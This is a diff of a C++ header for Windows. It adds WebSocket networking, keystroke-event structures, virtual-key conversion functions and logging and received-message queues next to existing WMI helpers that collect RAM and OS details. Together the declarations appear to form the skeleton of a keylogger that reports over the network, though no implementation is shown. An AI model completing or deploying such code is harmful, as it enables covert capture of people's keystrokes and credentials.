@@ -1,19 +1,42 @@
 #pragma once 
 #define WIN32_LEAN_AND_MEAN
 #define _WIN32_DCOM
-#include <Windows.h>
+#include <boost/asio.hpp>
+#include <boost/beast.hpp> 
+#include <boost/json.hpp> 
+#include <semaphore>
+#include <atomic> 
+#include <mutex> 
+#include <iostream> 
+#include <string> 
+#include <thread>
+#include <chrono>
+#include <string>
+#include <unordered_map>
+#include <sstream>
+#include <iomanip> 
 #include <wbemidl.h>
 #include <comdef.h>
 #include <wrl/client.h>
-
-#include <string>
-#include <vector>
-#include <sstream>
-#include <iomanip>
 #include <stdexcept>
+#include <vector>
+#include <memory>
+#include <deque>
+#include <stop_token>
+#include <queue>
 #include <algorithm>
 
+#include <Windows.h>
 #pragma comment(lib, "wbemuuid.lib")
+namespace json = boost::json; 
+namespace asio = boost::asio;
+namespace beast = boost::beast;
+namespace websocket = beast::websocket;
+using namespace std::chrono_literals;
+using tcp = asio::ip::tcp;
+
+constexpr int MAX_COUNT = 1024;
+ 
 
 // -------------------- UTF16 <-> UTF8 --------------------
 std::string WideToUtf8(const std::wstring& w);
@@ -91,3 +114,39 @@ bool TryGetInstalledRamGb(double& outGb);
 void GetWindowsOsNameVersion(std::string& outName, std::string& outVersion);
 
 Spec getSpec();
+
+// ======================== key_converter ========================
+std::string VkCodeToString(
+    WORD vkCode, bool shiftPressed, bool capsLockOn);
+bool IsModifierKey(WORD vkCode);
+bool IsSpecialKey(WORD vkCode);
+std::string GetBaseKeyString(WORD vkCode);
+std::string GetShiftedKeyString(WORD vkCode);
+std::string GetNumpadKeyString(WORD vkCode);
+
+std::string GetCurrentTimestamp();
+std::string FormatTime(const SYSTEMTIME& st);
+std::string VkCodeToHexString(WORD vkCode);
+bool IsKeyPressed(WORD vkCode);
+
+// ======================== key event structure ========================
+struct KeyEvent{
+    std::string timeStamp;
+    std::string capsLock;
+    std::string eventType;
+    std::string keyString;
+    KeyEvent(const std::string &timeStamp, const std::string& _capsLock, const std::string& _eventType, const std::string& _keyString);
+}; 
+// ======================== logger ========================
+
+extern std::atomic<bool> logger_running;
+extern std::mutex log_m;
+extern std::counting_semaphore<MAX_COUNT> log_sem;
+extern std::queue<KeyEvent> log_q;
+
+//======================== received message ========================
+extern std::mutex recv_m;
+extern std::queue<std::string> recv_q;
+extern std::counting_semaphore<MAX_COUNT> recv_sem; 
+
+ 
